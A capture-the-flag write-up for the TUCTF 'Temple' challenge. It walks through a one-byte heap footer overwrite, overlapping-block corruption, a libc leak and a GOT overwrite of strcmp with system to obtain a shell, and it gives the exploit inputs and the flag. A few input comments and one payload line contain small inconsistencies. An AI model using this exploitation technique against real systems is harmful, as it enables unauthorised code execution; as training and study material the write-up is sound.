# Temple

500 points

49 solves

>Have you come to gain wisdom at the temple?
>
>nc temple.tuctf.com 4343
>
>UPDATE:
>the temple binary has been updated. Please redownload.
>
>temple - md5: 8e61e448093f96043512bd3580223124
>
>libc.so.6 - md5: 8548e4731a83e6ed3fc167633d28c21f


It seems like we are going to need to corrupt the heap, since we are given the memory manager. So diving into `mm.c`, we notice that the heap is essentially structured as a flat list of blocks. Each block has a 8-byte header and footer. The footer and header are both essentially `allocSize | allocUsed`, where `allocUsed` is a bit for whether the block is in use or free. When an allocation is requested, it looks for the first free block of sufficient size. If the block is larger than requested, the remaining free space is split off into a new smaller free block. If there is no free blocks then `sbrk` is used to increase the heap space to create one.

We have a 1-byte overwrite past the payload in each allocation block which lets us overwrite the block's footer. Since the footer is little-endian this means we overwrite the used bit and the least significant byte of the size field. The footer is used when traversing the heap block list backwards, namely in `coalesce` which is used upon freeing. Specifically, it looks at the size of the previous block and subtracts it from the current block's pointer to calculate the pointer for the start of the previous block. When a block is freed and the previous block has a corrupted footer, given that the previous block was less than 0x100 bytes long, it believes that the previous block is 0 bytes long and subtracts 0 from the current block's address. As a result the calculated pointer to the start of the previous block is equal to the pointer of the current block. This ends up creating a coalesced free block that is too big and overlaps with the next block. Then, we could allocate a new block which fills this overlapped free block, letting us corrupt the following block.

So the game plan is to massage the heap using `give_wisdom`, then corrupt a block to let us get R/W access to arbitrary address. We use `modify_wisdom` to write and `take_wisdom` to read. Unfortunately, `take_wisdom` frees the wisdom which uncorrupts the heap, so we just need to setup the heap again. The heap will be structured like this before a read or write operation:

```
Low addresses  ^^^
00 Wisdom 8  metadata header
08 Wisdom 8  metadata text length
10 Wisdom 8  metadata text pointer
18 Wisdom 8  metadata name length
20 Wisdom 8  metadata name pointer
28 Wisdom 8  metadata footer
30 Wisdom 8  text header
38 Wisdom 8  text
40 Wisdom 8  text
48 Wisdom 8  text footer (clobbered to 0)
50 Wisdom 9  metadata header
58 Wisdom 9  metadata text length
60 Wisdom 9  metadata text pointer
68 Wisdom 9  metadata name length
70 Wisdom 9  metadata name pointer
78 Wisdom 9  metadata footer
80 Wisdom 9  text header
88 Wisdom 9  text
90 Wisdom 9  text
98 Wisdom 9  text footer (clobbered to 0)
a0 Wisdom 10 metadata header
a8 Wisdom 10 metadata text length
b0 Wisdom 10 metadata text pointer
b8 Wisdom 10 metadata name length
c0 Wisdom 10 metadata name pointer
c8 Wisdom 10 metadata footer
d0 Wisdom 10 text header
d8 Wisdom 10 text
e0 Wisdom 10 text
e8 Wisdom 10 text footer (clobbered to 0)
High addresses VVV
```

Then, after freeing Wisdom 8 and allocating Wisdom 11 in the hollowed, overlapping block:

```
Low addresses  ^^^
00 Wisdom 8  metadata header
08 Wisdom 8  metadata text length
10 Wisdom 8  metadata text pointer
18 Wisdom 8  metadata name length
20 Wisdom 8  metadata name pointer
28 Wisdom 8  metadata footer
30 Wisdom 8  text header
38 Wisdom 8  text
40 Wisdom 8  text
48 Wisdom 8  text footer (clobbered to 0)
50 Wisdom 11 metadata header
58 Wisdom 11 metadata text length
60 Wisdom 11 metadata text pointer
68 Wisdom 11 metadata name length
70 Wisdom 11 metadata name pointer
78 Wisdom 11 metadata footer
80 Wisdom 11 text header
88 Wisdom 11 text
90 Wisdom 11 text
98 Wisdom 11 text / Wisdom 10 metadata header
a0 Wisdom 11 text / Wisdom 10 metadata text length
a8 Wisdom 11 text / Wisdom 10 metadata text pointer
b0 Wisdom 11 text / Wisdom 10 metadata name length
b8 Wisdom 11 text / Wisdom 10 metadata name pointer
c0 Wisdom 11 text / Wisdom 10 metadata footer
c8 Wisdom 11 text footer (clobbered to 0)
d0 Wisdom 10 text header
d8 Wisdom 10 text
e0 Wisdom 10 text
e8 Wisdom 10 text footer (clobbered to 0)
High addresses VVV
```

So we have control over the Wisdom 10 metadata (pointers and lengths) and block header through Wisdom 11. So by doing operations on the corrupted Wisdom 10, we can get memory control.

Now we need to get ahold of control flow, which we do through overwriting GOT entries. We notice `strcmp` is called in `free_wisdom`, and the first parameter is the name pointer, which we control. So we first need to leak `libc` base using a read, then create a corrupted wisdom with the name pointing to `/bin/sh` and the text pointing to `strcmp`'s entry in the GOT. Then we do a write using the corrupted text pointer to detour `strcmp` to `system`.

So the input would look like this (we use `0123456789ABCDE` because it also has a trailing newline for a total of 16 bytes):
```
# Massage the heap
2 # Wisdom 8
16
0123456789ABCDE
2 # Wisdom 9
16
0123456789ABCDE
2 # Wisdom 10
16
0123456789ABCDE
1 # Free Wisdom 9
9
2 # Wisdom 11, corrupting Wisdom 10
64
('\x00\x00\x00\x00\x00\x00\x00\x00' * 4) + '\x08\x00\x00\x00\x00\x00\x00\x00' + packaddr(0x603038) + '\x00\x00\x00\x00\x00\x00\x00\x00' + packaddr(0x603038) # Name pointer doesn't matter as long as reading doesn't segfault
```
This leaks `libc`. Next:
```
# Massage the heap
2 # Wisdom 12
16
0123456789ABCDE
2 # Wisdom 13
16
0123456789ABCDE
2 # Wisdom 14
16
0123456789ABCDE
1 # Free Wisdom 13
9
2 # Wisdom 15, corrupting Wisdom 14
64
'\x00\x00\x00\x00\x00\x00\x00\x00' * 4) + '\x08\x00\x00\x00\x00\x00\x00\x00' + '\x70\x30\x60\x00\x00\x00\x00\x00' + packaddr(len('/bin/sh')) + packaddr(binsh)
3 # Overwrite strcmp to system in GOT, using corrupted Wisdom 14
14
packaddr(system)
1 # Free Wisdom 10 to trigger strcmp
14
```
And with that we have a shell. So then we just `cat flag.txt`.

`TUCTF{0n3_Byt3_0v3rwr1t3_Ac0lyt3}`

